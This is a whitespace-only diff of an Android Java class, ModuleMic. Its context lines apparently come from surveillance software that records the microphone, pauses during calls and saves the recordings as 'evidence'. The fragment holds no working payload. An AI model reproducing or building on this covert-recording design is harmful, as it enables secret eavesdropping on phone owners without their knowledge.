@@ -378,6 +378,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private void createSockets() {
 		receiver = new LocalSocket();
+		
 		try {
 			socketname = Long.toHexString(Utils.getRandom());
 			lss = new LocalServerSocket(socketname);
@@ -479,11 +480,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
 			}
+			
 			suspend();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): ");//$NON-NLS-1$
 			}
+			
 			resume();
 		}
 
@@ -496,6 +499,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			super.suspend();
 			saveRecorderEvidence();
 			stopRecorder();
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (suspended)");//$NON-NLS-1$
 			}
@@ -526,11 +530,11 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			}
 
 			super.resume();
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
 			}
 		}
-
 	}
 
 	public void onInfo(MediaRecorder mr, int what, int extra) {
@@ -543,6 +547,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
 		}
+		
 		stopRecorder();
 	}
 }
